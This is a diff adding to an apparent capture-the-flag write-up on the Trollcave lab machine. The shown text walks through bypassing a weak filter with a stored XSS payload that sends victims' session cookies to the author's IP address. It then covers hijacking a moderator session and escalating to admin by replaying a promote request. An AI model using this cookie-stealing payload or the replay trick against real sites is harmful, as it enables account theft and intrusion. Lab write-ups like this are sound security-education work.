@@ -29,3 +29,15 @@ Either way, the next step for me was to get one of those fancy moderator account
 Although there is a rudimentary WAF in place, circumventing it didn't take much. The `<script>` tag is filtered out of any post or comment, but all you need to do is include an attribute (i.e. `<script id=test>`) and it will go through. After some tinkering, I deduced that the session cookie is not protected in any way, and that stealing it will let you hijack a user's session - even if they click the logout button. To that end, I crafted the following XSS injection:
 
 `<SCRIPT id=test>document.write('<img src="http://192.168.56.1/collect.gif?cookie=' + document.cookie + '" />')</SCRIPT>`
+
+All I needed on the backend was a simple little Python script to collect the cookies being sent to my IP address. My assumption was correct - the page was being periodically accessed by cooldude89, and I shortly harvested his cookie and used it to log in as him. Now as moderator, I was able to set my sights on a higher prized.
+
+## Escalating from Moderator
+
+Above the role of moderator, there were two roles I didn't yet have access to: admin and superadmin. Once again, the blogs provided a valuable hint. This time, it came in the form of a blog post visible only to moderators that documents a "promote" functionality. Basically, any moderator can "promote" any regular member into a moderator. This is handy for escalating xer into a mod so I don't have to modify a cookie every time I want to log in, but it doesn't help me get to admin... or does it?
+
+When you promote someone to moderator, a POST request is made to a URI that looks something like `/users/12/mod`. After you've promoted them, the "mod" button goes away. This stops you from promoting someone who has already been promoted - but what if you just replay the POST request? By making a request to promote someone who is already a moderator, it is possible to promote them into an admin. The only catch is that you can't do it to yourself - so I promoted xer into a mod, then an admin.
+
+## Escalating from Admin
+
+Only one hurdle remains: the superadmin account. There is only one superadmin: King. As before, Trollcave has a hint for us. I had suspected that the file upload functionality - which is disabled - would eventually be how I got code execution. This was all but confirmed by an admin-only post which indicated that it was disabled due to "security concerns", and that only the superadmin could enable it. Another admin-only blog post informed us that King has quit to "find himself", and that dragon has taken his account - so we need to escalate laterally to his account. Whoever has King has access to the file upload functionality, which is the way in.
